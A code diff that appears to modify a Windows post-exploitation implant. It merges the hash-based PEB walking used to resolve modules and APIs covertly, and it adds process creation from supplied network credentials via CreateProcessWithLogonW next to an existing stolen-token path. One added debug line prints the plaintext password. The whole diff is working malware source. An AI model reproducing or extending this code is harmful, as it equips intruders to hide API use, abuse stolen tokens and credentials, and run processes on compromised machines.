@@ -56,37 +56,11 @@ BOOL W32CreateClrInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, 
     return 1;
 }
 
-UINT_PTR HashStringEx( LPVOID String, UINT_PTR Length )
-{
-    ULONG	Hash = 5381;
-    PUCHAR	Ptr  = String;
-
-    do
-    {
-        UCHAR character = *Ptr;
-
-        if ( ! Length )
-        {
-            if ( !*Ptr ) break;
-        }
-        else
-        {
-            if ( (ULONG) ( Ptr - (PUCHAR)String ) >= Length ) break;
-            if ( !*Ptr ) ++Ptr;
-        }
-
-        if ( character >= 'a' )
-            character -= 0x20;
-
-        Hash = ( ( Hash << 5 ) + Hash ) + character;
-        ++Ptr;
-    } while ( TRUE );
-
-    return Hash;
-}
-
 UINT_PTR HashEx( LPVOID String, UINT_PTR Length, BOOL Upper )
 {
+    if ( ! String )
+        return 0;
+
     ULONG	Hash = 5381;
     PUCHAR	Ptr  = String;
 
@@ -126,7 +100,7 @@ PVOID LdrModulePeb( DWORD hModuleHash )
 
     do
     {
-        ModuleHash = HashStringEx( pModule->FullDllName.Buffer, pModule->FullDllName.Length );
+        ModuleHash = HashEx( pModule->FullDllName.Buffer, pModule->FullDllName.Length, TRUE );
 
         if ( ModuleHash == hModuleHash )
             return pModule->Reserved2[ 0 ];
@@ -212,7 +186,7 @@ PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
         }
     }
 
-    PUTS( "API not found" )
+    PRINTF( "API not found: FunctionHash:[%lx]\n", FunctionHash )
 
     return NULL;
 }
@@ -328,6 +302,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         StartUpInfo.hStdOutput = AnonPipe->StdOutWrite;
         StartUpInfo.hStdInput  = NULL;
     }
+
     if ( DataAnonPipes )
     {
         PUTS( "Using specified anon pipes" )
@@ -363,6 +338,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
 
         if ( Instance->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
+            PUTS( "CreateProcessWithTokenW" )
             if ( ! Instance->Win32.CreateProcessWithTokenW(
                     Instance->Tokens.Token->Handle,
                     LOGON_NETCREDENTIALS_ONLY,
@@ -382,9 +358,35 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                 goto Cleanup;
             }
         }
+        else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
+        {
+            PUTS( "CreateProcessWithLogonW" )
+            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance->Tokens.Token->lpUser, Instance->Tokens.Token->lpDomain, Instance->Tokens.Token->lpPassword )
+            if ( ! Instance->Win32.CreateProcessWithLogonW(
+                        Instance->Tokens.Token->lpUser,
+                        Instance->Tokens.Token->lpDomain,
+                        Instance->Tokens.Token->lpPassword,
+                        LOGON_NETCREDENTIALS_ONLY,
+                        App,
+                        CommandLineW,
+                        Flags | CREATE_NO_WINDOW,
+                        NULL,
+                        NULL,
+                        &StartUpInfo,
+                        ProcessInfo
+                    )
+                )
+            {
+                PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                Return = FALSE;
+                goto Cleanup;
+            }
+        }
 
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
         Instance->Win32.LocalFree( CommandLineW );
+        CommandLineW = NULL;
     }
     else
     {
@@ -471,13 +473,18 @@ Cleanup:
     PUTS( "Process cleanup" )
     if ( CommandLineW )
     {
+        PUTS( "1" )
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
         Instance->Win32.LocalFree( CommandLineW );
     }
 
+    PUTS( "2" )
     PackageDestroy( Package );
+
+    PUTS( "3" )
     AnonPipesClose( &AnonPipe );
 
+    PUTS( "4" )
     return Return;
 }
 
